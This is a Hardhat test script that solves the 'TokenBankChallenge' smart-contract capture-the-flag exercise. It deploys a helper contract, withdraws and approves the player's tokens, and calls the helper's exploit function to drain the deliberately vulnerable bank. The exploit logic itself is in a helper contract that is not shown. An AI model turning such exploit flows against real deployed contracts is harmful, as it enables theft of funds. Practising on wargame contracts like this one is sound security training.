const { expect } = require("chai");
const { ethers } = require("hardhat");

describe.only("TokenBankChallenge", async function () {
    let deployer;
    let player;
    let contract;

    before(async function () {
        [deployer, player] = await ethers.getSigners();
        contract = await (await ethers.getContractFactory("TokenBankChallenge")).deploy(player.address);
    });

    it("Exploit", async function () {
        // WRITE YOUR CODE HERE

        // Setup
        const token = (await ethers.getContractFactory("SimpleERC223Token")).attach(await contract.token());
        const helper = await (await ethers.getContractFactory("TokenBankChallengeHelper")).connect(player).deploy(contract.address, token.address);

        // Approve all player's tokens to the helper contract
        const bal = (await contract.balanceOf(player.address));
        await contract.connect(player).withdraw(bal);
        expect(await token.balanceOf(player.address)).to.eq(bal);
        await token.connect(player).approve(helper.address, bal);

        // Run exploit
        await helper.connect(player).exploit();
    });

    after(async function () {
        expect(await contract.isComplete()).to.be.true;
    });
});